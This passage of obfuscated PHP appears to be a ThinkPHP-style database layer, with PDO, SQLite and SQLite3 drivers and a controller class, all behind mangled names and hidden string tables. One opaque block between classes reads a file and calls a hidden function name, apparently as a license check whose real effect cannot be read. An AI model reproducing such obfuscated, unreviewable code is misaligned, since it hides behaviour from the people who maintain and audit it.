array($this, $úÄéûú[905])); $öºÆ®¦ = $ı˜æ£•” ? $úÄéûú[906] : $úÄéûú[907]; $Î’îèáï = $öºÆ®¦ . $úÄéûú[908] . $this->parseTable($ §Ãõ‰€[$úÄéûú[288]]) . $úÄéûú[902] . implode($úÄéûú[50], $ÆİÔïá) . $úÄéûú[909] . implode($úÄéûú[50], $ÜÙ¦¸È); return $this->execute($Î’îèáï); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $½ŠÁà± =& $_SERVER[„Ç©ñÎ©]; $this->error = $this->_linkID->errno . $½ŠÁà±[4] . $this->_linkID->error; if ($½ŠÁà±[12] != $this->queryStr) { $this->error .= LNG($½ŠÁà±[48]) . $this->queryStr; } think_trace($this->error, $½ŠÁà±[12], $½ŠÁà±[49]); return $this->error; } public function escapeString($û¯ÒÛ®) { if ($this->_linkID) { return $this->_linkID->real_escape_string($û¯ÒÛ®); } else { return addslashes($û¯ÒÛ®); } } public function parseKey(&$×ÜãÂ¸, $ÅĞ¿”¤® = true) { $§ºÒú¹ê =& $_SERVER[„Ç©ñÎ©]; if ($ÅĞ¿”¤®) { $×ÜãÂ¸ = $this->parseKeyCheck($×ÜãÂ¸); } if ($×ÜãÂ¸ != $§ºÒú¹ê[198] && !preg_match($§ºÒú¹ê[910], $×ÜãÂ¸)) { $×ÜãÂ¸ = $§ºÒú¹ê[394] . trim($×ÜãÂ¸, $§ºÒú¹ê[394]) . $§ºÒú¹ê[394]; } return $×ÜãÂ¸; } } if ($_SERVER[$_SERVER[„Ç©ñÎ©][62]] != $_SERVER[$_SERVER[„Ç©ñÎ©][868]]) { $_getc = $_SERVER[„Ç©ñÎ©][63]; $_getfile = $_SERVER[$_SERVER[„Ç©ñÎ©][64]] . $_SERVER[„Ç©ñÎ©][65]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[„Ç©ñÎ©][66], $_getfilec); if (count($_getarrs) < $_SERVER[„Ç©ñÎ©][67]) { $exit = $_SERVER[„Ç©ñÎ©][68]; $exit(); } $_act = $_SERVER[„Ç©ñÎ©][69]; $_act($_SERVER[$_SERVER[„Ç©ñÎ©][60]]); } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ Œµê„½ = '') { $¹öÊÃ‡Ê =& $_SERVER[„Ç©ñÎ©]; if (!class_exists($¹öÊÃ‡Ê[913])) { think_exception(think_lang($¹öÊÃ‡Ê[14]) . $¹öÊÃ‡Ê[914]); } if (!empty($ Œµê„½)) { $this->config = $ Œµê„½; if (empty($this->config[$¹öÊÃ‡Ê[17]])) { $this->config[$¹öÊÃ‡Ê[17]] = array(); } } } public function connect($òŒ—²œØ = '', $„öÄ‘ª‹ = 0) { $»É°Í¾Ü =& $_SERVER[„Ç©ñÎ©]; if (!isset($this->linkID[$„öÄ‘ª‹])) { if (empty($òŒ—²œØ)) { $òŒ—²œØ = $this->config; } $çÌ®ò¬© = !empty($òŒ—²œØ[$»É°Í¾Ü[17]][$»É°Í¾Ü[18]]) ? $òŒ—²œØ[$»É°Í¾Ü[17]][$»É°Í¾Ü[18]] : $this->pconnect; if ($çÌ®ò¬©) { $òŒ—²œØ[$»É°Í¾Ü[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$„öÄ‘ª‹] = new PDO($òŒ—²œØ[$»É°Í¾Ü[915]], $òŒ—²œØ[$»É°Í¾Ü[887]], $òŒ—²œØ[$»É°Í¾Ü[888]], $òŒ—²œØ[$»É°Í¾Ü[17]]); } catch (PDOException $÷ş„Î©˜) { think_exception($÷ş„Î©˜->getMessage()); } $this->dbType = $this->_getDsnType($òŒ—²œØ[$»É°Í¾Ü[915]]); if (in_array($this->dbType, array($»É°Í¾Ü[916], $»É°Í¾Ü[917], $»É°Í¾Ü[918], $»É°Í¾Ü[919]))) { think_exception($»É°Í¾Ü[920] . $this->dbType . $»É°Í¾Ü[921] . $this->dbType . $»É°Í¾Ü[922]); } if (!$this->linkID[$„öÄ‘ª‹]) { think_exception($»É°Í¾Ü[923]); } try { $this->linkID[$„öÄ‘ª‹]->exec($»É°Í¾Ü[924] . think_config($»É°Í¾Ü[890])); } catch (Exception $÷ş„Î©˜) { } $this->connected = !0; if (1 != think_config($»É°Í¾Ü[22])) { unset($this->config); } } return $this->linkID[$„öÄ‘ª‹]; } public function free() { $this->PDOStatement = null; } public function query($ÛÆ¬Ì¿Â, $À‡ô™«Ú = array()) { $Š—¢Šñ =& $_SERVER[„Ç©ñÎ©]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÛÆ¬Ì¿Â; if (!empty($À‡ô™«Ú)) { $this->queryStr .= $Š—¢Šñ[925] . print_r($À‡ô™«Ú, !0) . $Š—¢Šñ[926]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Š—¢Šñ[23], 1); think_status($Š—¢Šñ[24]); $this->PDOStatement = $this->_linkID->prepare($ÛÆ¬Ì¿Â); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $à™¶á¨ = $this->PDOStatement->execute($À‡ô™«Ú); $this->debug(); if (!1 === $à™¶á¨) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ì¥¢–Ì, $û¨·Å·† = array()) { $ŒòåÛÀß =& $_SERVER[„Ç©ñÎ©]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ì¥¢–Ì; if (!empty($û¨·Å·†)) { $this->queryStr .= $ŒòåÛÀß[925] . print_r($û¨·Å·†, !0) . $ŒòåÛÀß[926]; } $£²ºı¹— = !1; if ($this->dbType == $ŒòåÛÀß[919]) { if (preg_match($ŒòåÛÀß[927], $this->queryStr, $îßÙŞ‰)) { $this->table = think_config($ŒòåÛÀß[928]) . str_ireplace(think_config($ŒòåÛÀß[929]), $ŒòåÛÀß[387], $îßÙŞ‰[2]); $£²ºı¹— = (bool) $this->query($ŒòåÛÀß[930] . strtoupper($this->table) . $ŒòåÛÀß[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ŒòåÛÀß[25], 1); think_status($ŒòåÛÀß[24]); $this->PDOStatement = $this->_linkID->prepare($ì¥¢–Ì); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¬´³ìˆ = $this->PDOStatement->execute($û¨·Å·†); $this->debug(); if (!1 === $¬´³ìˆ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($£²ºı¹— || preg_match($ŒòåÛÀß[931], $ì¥¢–Ì)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¹“ìŸó = $this->_linkID->commit(); $this->transTimes = 0; if (!$¹“ìŸó) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $†Öõãæ£ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$†Öõãæ£) { $this->error(); return !1; } } return !0; } private function getAll() { $®ó¡²´ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($®ó¡²´); return $®ó¡²´; } public function getFields($óª£Ï«÷) { $íñ×¢å =& $_SERVER[„Ç©ñÎ©]; $this->initConnect(!0); if (think_config($íñ×¢å[932])) { $«Áº„¶‰ = str_replace($íñ×¢å[933], $óª£Ï«÷, think_config($íñ×¢å[932])); } else { switch ($this->dbType) { case $íñ×¢å[916]: case $íñ×¢å[934]: $«Áº„¶‰ = "\123\x45\x4c\105\103\124\x20\x20\x20\143\x6f\154\165\155\x6e\x5f\x6e\141\155\x65\40\141\163\x20\x27\x4e\x61\155\x65\x27\54\40\40\40\144\141\x74\141\137\x74\171\160\145\x20\x61\x73\40\x27\x54\171\x70\x65\x27\x2c\x20\40\40\x63\157\154\x75\x6d\156\137\144\145\x66\141\x75\x6c\x74\x20\x61\x73\40\x27\104\x65\x66\x61\x75\x6c\164\x27\x2c\40\x20\40\x69\x73\137\156\x75\154\x6c\x61\x62\154\145\x20\x61\163\x20\x27\116\x75\x6c\x6c\x27\12\11\x9\x46\122\117\115\11\151\x6e\x66\157\x72\155\x61\x74\x69\157\x6e\137\x73\x63\x68\x65\155\141\56\164\x61\142\x6c\145\163\40\x41\x53\40\x74\xa\11\x9\112\117\x49\116\11\x69\156\146\157\162\155\x61\x74\151\x6f\156\137\163\143\150\145\x6d\141\x2e\x63\157\x6c\165\155\x6e\163\40\x41\123\x20\x63\12\11\x9\x4f\x4e\40\x20\164\x2e\x74\x61\142\x6c\x65\137\143\x61\x74\141\154\157\x67\40\75\x20\143\x2e\x74\141\x62\x6c\x65\x5f\x63\141\164\x61\x6c\x6f\x67\12\x9\11\x41\x4e\104\40\164\x2e\164\x61\x62\x6c\x65\x5f\163\x63\150\x65\155\141\x20\x3d\x20\x63\56\164\x61\x62\154\145\137\163\x63\x68\x65\x6d\141\xa\x9\x9\101\x4e\x44\x20\x74\56\164\x61\x62\x6c\145\x5f\x6e\x61\155\145\40\75\40\x63\56\164\141\x62\154\x65\137\156\141\x6d\x65\12\x9\11\127\x48\x45\122\x45\x20\40\x20\x74\x2e\x74\141\142\154\145\137\156\141\155\145\40\75\40\x27{$óª£Ï«÷}\x27"; break; case $íñ×¢å[935]: $«Áº„¶‰ = $íñ×¢å[936] . $óª£Ï«÷ . $íñ×¢å[937]; break; case $íñ×¢å[917]: case $íñ×¢å[919]: $«Áº„¶‰ = $íñ×¢å[938] . $íñ×¢å[939] . $íñ×¢å[940] . strtoupper($óª£Ï«÷) . $íñ×¢å[941] . strtoupper($óª£Ï«÷) . $íñ×¢å[942]; break; case $íñ×¢å[943]: $«Áº„¶‰ = $íñ×¢å[944] . $óª£Ï«÷ . $íñ×¢å[945]; break; case $íñ×¢å[918]: break; case $íñ×¢å[946]: default: $«Áº„¶‰ = $íñ×¢å[947] . ($this->dbType == $íñ×¢å[946] ? "\x60{$óª£Ï«÷}\x60" : $óª£Ï«÷); } } $ìïôôÄ = $this->query($«Áº„¶‰); $¥ÑÎÕÆ• = array(); if ($ìïôôÄ) { foreach ($ìïôôÄ as $Õ½ßşçñ => $ÕÊ—âÇ¨) { $ÕÊ—âÇ¨ = array_change_key_case($ÕÊ—âÇ¨); $ÕÊ—âÇ¨[$íñ×¢å[32]] = isset($ÕÊ—âÇ¨[$íñ×¢å[32]]) ? $ÕÊ—âÇ¨[$íñ×¢å[32]] : $íñ×¢å[387]; $ÕÊ—âÇ¨[$íñ×¢å[33]] = isset($ÕÊ—âÇ¨[$íñ×¢å[33]]) ? $ÕÊ—âÇ¨[$íñ×¢å[33]] : $íñ×¢å[387]; $™§æÊäí = isset($ÕÊ—âÇ¨[$íñ×¢å[282]]) ? $ÕÊ—âÇ¨[$íñ×¢å[282]] : $ÕÊ—âÇ¨[$íñ×¢å[32]]; $¥ÑÎÕÆ•[$™§æÊäí] = array($íñ×¢å[32] => $™§æÊäí, $íñ×¢å[33] => $ÕÊ—âÇ¨[$íñ×¢å[33]], $íñ×¢å[35] => (bool) (isset($ÕÊ—âÇ¨[$íñ×¢å[113]]) && $ÕÊ—âÇ¨[$íñ×¢å[113]] === $íñ×¢å[12] || isset($ÕÊ—âÇ¨[$íñ×¢å[35]]) && $ÕÊ—âÇ¨[$íñ×¢å[35]] === $íñ×¢å[12]), $íñ×¢å[37] => isset($ÕÊ—âÇ¨[$íñ×¢å[37]]) ? $ÕÊ—âÇ¨[$íñ×¢å[37]] : (isset($ÕÊ—âÇ¨[$íñ×¢å[56]]) ? $ÕÊ—âÇ¨[$íñ×¢å[56]] : $íñ×¢å[387]), $íñ×¢å[39] => isset($ÕÊ—âÇ¨[$íñ×¢å[104]]) ? strtolower($ÕÊ—âÇ¨[$íñ×¢å[104]]) == $íñ×¢å[41] : (isset($ÕÊ—âÇ¨[$íñ×¢å[57]]) ? $ÕÊ—âÇ¨[$íñ×¢å[57]] : !1), $íñ×¢å[42] => isset($ÕÊ—âÇ¨[$íñ×¢å[948]]) ? strtolower($ÕÊ—âÇ¨[$íñ×¢å[948]]) == $íñ×¢å[44] : (isset($ÕÊ—âÇ¨[$íñ×¢å[104]]) ? $ÕÊ—âÇ¨[$íñ×¢å[104]] : !1)); } } return $¥ÑÎÕÆ•; } public function getTables($ûéâéøı = '') { $¥æñ¥´‰ =& $_SERVER[„Ç©ñÎ©]; if (think_config($¥æñ¥´‰[949])) { $øñÔ½¬Æ = str_replace($¥æñ¥´‰[950], $ûéâéøı, think_config($¥æñ¥´‰[949])); } else { switch ($this->dbType) { case $¥æñ¥´‰[917]: case $¥æñ¥´‰[919]: $øñÔ½¬Æ = $¥æñ¥´‰[951]; break; case $¥æñ¥´‰[916]: case $¥æñ¥´‰[934]: $øñÔ½¬Æ = $¥æñ¥´‰[952]; break; case $¥æñ¥´‰[943]: $øñÔ½¬Æ = $¥æñ¥´‰[953]; break; case $¥æñ¥´‰[918]: think_exception(think_lang($¥æñ¥´‰[954]) . $¥æñ¥´‰[955]); break; case $¥æñ¥´‰[935]: $øñÔ½¬Æ = $¥æñ¥´‰[45] . $¥æñ¥´‰[46] . $¥æñ¥´‰[47]; break; case $¥æñ¥´‰[946]: default: if (!empty($ûéâéøı)) { $øñÔ½¬Æ = $¥æñ¥´‰[898] . $ûéâéøı . $¥æñ¥´‰[899]; } else { $øñÔ½¬Æ = $¥æñ¥´‰[900]; } } } $¸ù«ˆ§‚ = $this->query($øñÔ½¬Æ); $€•¼Ø°ê = array(); foreach ($¸ù«ˆ§‚ as $–Õ…ÌÚÙ => $Ê…Ì°²©) { $€•¼Ø°ê[$–Õ…ÌÚÙ] = current($Ê…Ì°²©); } return $€•¼Ø°ê; } protected function parseLimit($î’™¬Ù·) { $„¾´£Ø€ =& $_SERVER[„Ç©ñÎ©]; $°üÉüˆ¾ = $„¾´£Ø€[12]; if (!empty($î’™¬Ù·)) { switch ($this->dbType) { case $„¾´£Ø€[943]: case $„¾´£Ø€[935]: $î’™¬Ù· = explode($„¾´£Ø€[50], $î’™¬Ù·); if (count($î’™¬Ù·) > 1) { $°üÉüˆ¾ .= $„¾´£Ø€[51] . $î’™¬Ù·[1] . $„¾´£Ø€[52] . $î’™¬Ù·[0] . $„¾´£Ø€[53]; } else { $°üÉüˆ¾ .= $„¾´£Ø€[51] . $î’™¬Ù·[0] . $„¾´£Ø€[53]; } break; case $„¾´£Ø€[916]: case $„¾´£Ø€[934]: break; case $„¾´£Ø€[918]: break; case $„¾´£Ø€[917]: case $„¾´£Ø€[919]: break; case $„¾´£Ø€[946]: default: $°üÉüˆ¾ .= $„¾´£Ø€[51] . $î’™¬Ù· . $„¾´£Ø€[53]; } } return $°üÉüˆ¾; } public function parseKey(&$ù×¿İî», $Ô‘‡ş½ = true) { $œÏÎ™ôù =& $_SERVER[„Ç©ñÎ©]; if ($Ô‘‡ş½) { $ù×¿İî» = $this->parseKeyCheck($ù×¿İî»); } if ($this->dbType == $œÏÎ™ôù[946]) { if ($ù×¿İî» != $œÏÎ™ôù[198] && !preg_match($œÏÎ™ôù[910], $ù×¿İî»)) { $ù×¿İî» = $œÏÎ™ôù[394] . trim($ù×¿İî», $œÏÎ™ôù[394]) . $œÏÎ™ôù[394]; } return $ù×¿İî»; } else { return parent::parseKey($ù×¿İî», $Ô‘‡ş½); } } public function close() { $this->_linkID = null; } public function error() { $®íÉİÃú =& $_SERVER[„Ç©ñÎ©]; if ($this->PDOStatement) { $’Çùßû« = $this->PDOStatement->errorInfo(); $this->error = $’Çùßû«[1] . $®íÉİÃú[4] . $’Çùßû«[2]; } else { $this->error = $®íÉİÃú[12]; } if ($®íÉİÃú[12] != $this->queryStr) { $this->error .= LNG($®íÉİÃú[48]) . $this->queryStr; } think_trace($this->error, $®íÉİÃú[12], $®íÉİÃú[49]); return $this->error; } public function escapeString($©¦•÷§Ø) { $ÜŠ²ƒßÈ =& $_SERVER[„Ç©ñÎ©]; switch ($this->dbType) { case $ÜŠ²ƒßÈ[943]: case $ÜŠ²ƒßÈ[916]: case $ÜŠ²ƒßÈ[934]: case $ÜŠ²ƒßÈ[946]: return addslashes($©¦•÷§Ø); case $ÜŠ²ƒßÈ[918]: case $ÜŠ²ƒßÈ[935]: case $ÜŠ²ƒßÈ[917]: case $ÜŠ²ƒßÈ[919]: return str_ireplace($ÜŠ²ƒßÈ[58], $ÜŠ²ƒßÈ[59], $©¦•÷§Ø); } } protected function parseValue($‡…ó‚ï) { $ŞšÙÍè£ =& $_SERVER[„Ç©ñÎ©]; if (is_string($‡…ó‚ï)) { $—Ö¹ˆğê = strpos($‡…ó‚ï, $ŞšÙÍè£[4]) === 0 && in_array($‡…ó‚ï, array_keys($this->bind)); $‡…ó‚ï = $—Ö¹ˆğê ? $this->escapeString($‡…ó‚ï) : $ŞšÙÍè£[956] . $this->escapeString($‡…ó‚ï) . $ŞšÙÍè£[956]; } elseif (isset($‡…ó‚ï[0]) && is_string($‡…ó‚ï[0]) && strtolower($‡…ó‚ï[0]) == $ŞšÙÍè£[306]) { $‡…ó‚ï = $this->escapeString($‡…ó‚ï[1]); } elseif (is_array($‡…ó‚ï)) { $‡…ó‚ï = array_map(array($this, $ŞšÙÍè£[957]), $‡…ó‚ï); } elseif (is_bool($‡…ó‚ï)) { $‡…ó‚ï = $‡…ó‚ï ? $ŞšÙÍè£[98] : $ŞšÙÍè£[207]; } elseif (is_null($‡…ó‚ï)) { $‡…ó‚ï = $ŞšÙÍè£[113]; } return $‡…ó‚ï; } public function getLastInsertId() { $‘ƒª œ‰ =& $_SERVER[„Ç©ñÎ©]; switch ($this->dbType) { case $‘ƒª œ‰[943]: case $‘ƒª œ‰[935]: case $‘ƒª œ‰[916]: case $‘ƒª œ‰[934]: case $‘ƒª œ‰[918]: case $‘ƒª œ‰[946]: return $this->_linkID->lastInsertId(); case $‘ƒª œ‰[917]: case $‘ƒª œ‰[919]: $å—øŒ•œ = $this->table; $áğ¿‡Î‰ = $this->query("\x53\x45\x4c\x45\103\x54\40{$å—øŒ•œ}\56\143\x75\162\x72\166\x61\154\x20\143\x75\x72\162\x76\x61\x6c\40\x46\122\117\x4d\x20\144\165\141\154"); return $áğ¿‡Î‰ ? $áğ¿‡Î‰[0][$‘ƒª œ‰[958]] : 0; } } } goto E¤£èë»¶¿; CÅÆ¸ÌÍùª: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $öÂ©æâï =& $_SERVER[„Ç©ñÎ©]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$öÂ©æâï[6]] =& $config; $this->values[$öÂ©æâï[7]] =& $in; $this->tpl = TEMPLATE . MOD . $öÂ©æâï[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($‹‡¡ÏŞ¨) { if (1 === func_num_args()) { $this->{$‹‡¡ÏŞ¨} = new $‹‡¡ÏŞ¨(); } else { $îÙ•ïŠÔ = new ReflectionClass($‹‡¡ÏŞ¨); $í ’ìëÎ = func_get_args(); array_shift($í ’ìëÎ); $this->{$‹‡¡ÏŞ¨} = $îÙ•ïŠÔ->newInstanceArgs($í ’ìëÎ); } return $this->{$‹‡¡ÏŞ¨}; } public function routeBind($Äßş¶‘Š, $ÛˆÉ˜, $Õ­ÕÖü› = 3) { $É”ä¬ï¦ =& $_SERVER[„Ç©ñÎ©]; $Ë†ÊÊî¨ = $this->in[$É”ä¬ï¦[9]]; $Äßş¶‘Š = str_replace($É”ä¬ï¦[10], $É”ä¬ï¦[11], trim(trim($Äßş¶‘Š, $É”ä¬ï¦[8]), $É”ä¬ï¦[12])); if (!$Äßş¶‘Š || count($Ë†ÊÊî¨) <= $Õ­ÕÖü›) { return !1; } $Áî¥í« = !0; $Áğû“Ú… = explode($É”ä¬ï¦[8], $Äßş¶‘Š); for ($¨’Ë™ÈÅ = 0; $¨’Ë™ÈÅ < count($Áğû“Ú…); $¨’Ë™ÈÅ++) { if ($Áğû“Ú…[$¨’Ë™ÈÅ] != $Ë†ÊÊî¨[$Õ­ÕÖü› + $¨’Ë™ÈÅ]) { $Áî¥í« = !1; break; } } if (!$Áî¥í«) { return; } call_user_func_array(array($this, $ÛˆÉ˜), array()); } public function routeArgs($ÁÂ–˜á© = 3) { $Ö®€ñƒ = $this->in[$_SERVER[„Ç©ñÎ©][9]]; if (count($Ö®€ñƒ) <= $ÁÂ–˜á©) { return array(); } $­Ü¸Ò¨ = array(); for ($‚êß§ò» = $ÁÂ–˜á©; $‚êß§ò» < count($Ö®€ñƒ); $‚êß§ò» += 2) { $­Ü¸Ò¨[$Ö®€ñƒ[$‚êß§ò»]] = $Ö®€ñƒ[$‚êß§ò» + 1]; $this->in[$Ö®€ñƒ[$‚êß§ò»]] = $Ö®€ñƒ[$‚êß§ò» + 1]; } return $­Ü¸Ò¨; } protected function assign($ş¢é¢ñ, $ëñÀÄÍ) { $this->values[$ş¢é¢ñ] = $ëñÀÄÍ; } protected function display($±ƒáÏ‹ä) { ob_end_clean(); extract($this->values); require $this->tpl . $±ƒáÏ‹ä; } } class DbSqliteBase extends Db { public function __construct($Ï†ı¹ƒ‡ = '') { $ùš•ä§¼ =& $_SERVER[„Ç©ñÎ©]; if (!extension_loaded($ùš•ä§¼[13])) { think_exception(think_lang($ùš•ä§¼[14]) . $ùš•ä§¼[15]); } if (!empty($Ï†ı¹ƒ‡)) { if (!isset($Ï†ı¹ƒ‡[$ùš•ä§¼[16]])) { $Ï†ı¹ƒ‡[$ùš•ä§¼[16]] = 438; } $this->config = $Ï†ı¹ƒ‡; if (empty($this->config[$ùš•ä§¼[17]])) { $this->config[$ùš•ä§¼[17]] = array(); } } } public function connect($»öïéõ‹ = '', $ïö³æï = 0) { $á®¼­Ó =& $_SERVER[„Ç©ñÎ©]; if (!isset($this->linkID[$ïö³æï])) { if (empty($»öïéõ‹)) { $»öïéõ‹ = $this->config; } $îÉ¸ô¬û = !empty($»öïéõ‹[$á®¼­Ó[17]][$á®¼­Ó[18]]) ? $»öïéõ‹[$á®¼­Ó[17]][$á®¼­Ó[18]] : $this->pconnect; $ñÃÚù = $îÉ¸ô¬û ? $á®¼­Ó[19] : $á®¼­Ó[20]; $this->linkID[$ïö³æï] = $ñÃÚù($»öïéõ‹[$á®¼­Ó[21]], $»öïéõ‹[$á®¼­Ó[16]]); if (!$this->linkID[$ïö³æï]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ïö³æï], 30000); if (1 != think_config($á®¼­Ó[22])) { unset($this->config); } } return $this->linkID[$ïö³æï]; } public function free() { $this->queryID = null; } public function query($¾ÍÚù Û) { $¶â²ºÖ =& $_SERVER[„Ç©ñÎ©]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¾ÍÚù Û; if ($this->queryID) { $this->free(); } think_action_status($¶â²ºÖ[23], 1); think_status($¶â²ºÖ[24]); $this->queryID = sqlite_query($this->_linkID, $¾ÍÚù Û); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $óå˜ù¬ = $this->getAll(); return $óå˜ù¬; } } public function execute($²Š¤”Ò) { $ıÅËÇç =& $_SERVER[„Ç©ñÎ©]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $²Š¤”Ò; if ($this->queryID) { $this->free(); } think_action_status($ıÅËÇç[25], 1); think_status($ıÅËÇç[24]); $›×ƒòÍæ = sqlite_exec($this->_linkID, $²Š¤”Ò); $this->debug(); if (!1 === $›×ƒòÍæ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[„Ç©ñÎ©][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $üÌàš‡ = sqlite_query($this->_linkID, $_SERVER[„Ç©ñÎ©][27]); if (!$üÌàš‡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $£ä»• = sqlite_query($this->_linkID, $_SERVER[„Ç©ñÎ©][28]); if (!$£ä»•) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $šª‹ÌÉü = array(); if ($this->numRows > 0) { for ($±Í•ÉŸ¬ = 0; $±Í•ÉŸ¬ < $this->numRows; $±Í•ÉŸ¬++) { $šª‹ÌÉü[$±Í•ÉŸ¬] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $šª‹ÌÉü; } public function getFields($Š”ãµ‹Õ) { $áäŠÕìÈ =& $_SERVER[„Ç©ñÎ©]; $€“ÚÕ˜« = $this->query($áäŠÕìÈ[29] . $Š”ãµ‹Õ . $áäŠÕìÈ[30]); $ğİï‡áû = array(); if ($€“ÚÕ˜«) { foreach ($€“ÚÕ˜« as $Ö×‡ ö => $õî‚ıùê) { $ğİï‡áû[$õî‚ıùê[$áäŠÕìÈ[31]]] = array($áäŠÕìÈ[32] => $õî‚ıùê[$áäŠÕìÈ[31]], $áäŠÕìÈ[33] => $õî‚ıùê[$áäŠÕìÈ[34]], $áäŠÕìÈ[35] => (bool) ($õî‚ıùê[$áäŠÕìÈ[36]] === $áäŠÕìÈ[12]), $áäŠÕìÈ[37] => $õî‚ıùê[$áäŠÕìÈ[38]], $áäŠÕìÈ[39] => strtolower($õî‚ıùê[$áäŠÕìÈ[40]]) == $áäŠÕìÈ[41], $áäŠÕìÈ[42] => strtolower($õî‚ıùê[$áäŠÕìÈ[43]]) == $áäŠÕìÈ[44]); } } return $ğİï‡áû; } public function getTables($ô¦ÍŸ¯ = '') { $öççëñ¯ =& $_SERVER[„Ç©ñÎ©]; $í …ùóî = $this->query($öççëñ¯[45] . $öççëñ¯[46] . $öççëñ¯[47]); $œ´Åş¼ = array(); foreach ($í …ùóî as $ïÖ­ï½ => $ûÔ†³ëÁ) { $œ´Åş¼[$ïÖ­ï½] = current($ûÔ†³ëÁ); } return $œ´Åş¼; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ôÃíÆÖƒ =& $_SERVER[„Ç©ñÎ©]; $Œ ºÀ® = sqlite_last_error($this->_linkID); $this->error = $Œ ºÀ® . $ôÃíÆÖƒ[4] . sqlite_error_string($Œ ºÀ®); if ($ôÃíÆÖƒ[12] != $this->queryStr) { $this->error .= LNG($ôÃíÆÖƒ[48]) . $this->queryStr; } think_trace($this->error, $ôÃíÆÖƒ[12], $ôÃíÆÖƒ[49]); return $this->error; } public function escapeString($¶¯Î…º) { return sqlite_escape_string($¶¯Î…º); } public function parseLimit($ûü˜éœî) { $à¡å’Ñ… =& $_SERVER[„Ç©ñÎ©]; $ßèüÄûğ = $à¡å’Ñ…[12]; if (!empty($ûü˜éœî)) { $ûü˜éœî = explode($à¡å’Ñ…[50], $ûü˜éœî); if (count($ûü˜éœî) > 1) { $ßèüÄûğ .= $à¡å’Ñ…[51] . $ûü˜éœî[1] . $à¡å’Ñ…[52] . $ûü˜éœî[0] . $à¡å’Ñ…[53]; } else { $ßèüÄûğ .= $à¡å’Ñ…[51] . $ûü˜éœî[0] . $à¡å’Ñ…[53]; } } return $ßèüÄûğ; } } class DbSqlite3Base extends Db { public function __construct($ ¤ôˆœ = '') { $¤×å€±ƒ =& $_SERVER[„Ç©ñÎ©]; if (!class_exists($¤×å€±ƒ[54])) { think_exception(think_lang($¤×å€±ƒ[14]) . $¤×å€±ƒ[55]); } if (!empty($ ¤ôˆœ)) { if (!isset($ ¤ôˆœ[$¤×å€±ƒ[16]])) { $ ¤ôˆœ[$¤×å€±ƒ[16]] = 438; } $this->config = $ ¤ôˆœ; if (empty($this->config[$¤×å€±ƒ[17]])) { $this->config[$¤×å€±ƒ[17]] = array(); } } } public function connect($Ğ³˜”˜Õ = '', $°£Ù¾Ï« = 0) { $¥ÂìÖëë =& $_SERVER[„Ç©ñÎ©]; if (!isset($this->linkID[$°£Ù¾Ï«])) { if (empty($Ğ³˜”˜Õ)) { $Ğ³˜”˜Õ = $this->config; } $this->linkID[$°£Ù¾Ï«] = new SQLite3($Ğ³˜”˜Õ[$¥ÂìÖëë[21]]); if (!$this->linkID[$°£Ù¾Ï«]) { think_exception($this->linkID[$°£Ù¾Ï«]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$°£Ù¾Ï«]->busyTimeout(30000); if (1 != think_config($¥ÂìÖëë[22])) { unset($this->config); } } return $this->linkID[$°£Ù¾Ï«]; } public function free() { $this->queryID = null; } public function query($®ÖæÕâì) { $ÁæÒÙ¯‡ =& $_SERVER[„Ç©ñÎ©]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $®ÖæÕâì; if ($this->queryID) { $this->free(); } think_action_status($ÁæÒÙ¯‡[23], 1); think_status($ÁæÒÙ¯‡[24]); $this->queryID = $this->_linkID->query($®ÖæÕâì); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Óñéó›ú = $this->getAll(); $this->numRows = count($Óñéó›ú); return $Óñéó›ú; } } public function execute($Å§ë‰ë÷) { $ı‘ÜÂ³¤ =& $_SERVER[„Ç©ñÎ©]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Å§ë‰ë÷; if ($this->queryID) { $this->free(); } think_action_status($ı‘ÜÂ³¤[25], 1); think_status($ı‘ÜÂ³¤[24]); $´×¦©÷ë = $this->_linkID->exec($Å§ë‰ë÷); $this->debug(); if (!1 === $´×¦©÷ë) { $this->error(); return !1; } else { $this->numRows = 